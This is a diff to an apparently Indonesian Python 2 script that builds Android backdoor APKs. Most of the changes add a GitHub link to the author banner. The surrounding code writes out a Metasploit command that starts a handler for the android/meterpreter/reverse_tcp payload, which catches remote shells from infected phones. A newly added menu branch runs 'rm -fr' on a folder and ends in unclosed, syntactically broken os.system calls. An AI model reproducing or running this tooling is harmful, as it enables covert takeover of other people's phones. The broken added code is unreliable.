@@ -26,7 +26,7 @@ def menu():
     print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
     print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
     print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
-    print "\033[36;1mGithub\033[37;1m  :"
+    print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
     print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
     print
     print "\033[32;1m         [+] MENU [+]"
@@ -52,7 +52,7 @@ def menu():
         print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
         print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
         print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
-        print "\033[36;1mGithub\033[37;1m  :"
+        print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
         print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
         print
         print "\033[37;1mContoh nama backdoor \033[33;1m==> \033[31;1mwifi.apk"
@@ -83,7 +83,7 @@ def menu():
         print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
         print "\033[36;1mAuthor\033[37;1m  : \033[33;1mCyber noob"
         print "\033[36;1mYoutube\033[37;1m : \033[33;1mSeven Gaming"
-        print "\033[36;1mGithub\033[37;1m  :"
+        print "\033[36;1mGithub\033[37;1m  : \033[33;1mhttps://github.com/Seven-Gaming"
         print "\033[36;1m+\033[33;1m-------------------------------\033[36;1m+"
         os.system('rm -rf ip.txt')
         os.system('ifconfig > ip.txt')
@@ -115,6 +115,9 @@ def menu():
           os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
           raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
           bersih()
+    elif pil == "4":
+        os.system("rm -fr Hackfb"
+        os.system("
     elif pil == "0":
         os.system("exit")
         print
